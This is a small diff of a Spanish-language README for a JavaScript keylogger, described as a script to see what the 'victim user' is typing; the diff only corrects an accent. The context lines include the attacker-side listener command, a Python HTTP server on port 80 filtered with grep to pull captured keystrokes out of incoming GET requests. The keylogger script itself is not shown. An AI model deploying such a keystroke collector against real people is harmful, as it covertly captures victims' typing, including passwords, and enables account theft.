@@ -1,6 +1,6 @@
 # KeyLogger
 
-Script en js para ver que esta tecleando el usuario victima
+Script en js para ver que está tecleando el usuario victima
 
 ```
 python3 -m http.server 80 2>&1 | grep -oP 'GET /\K[^.*\s]+'
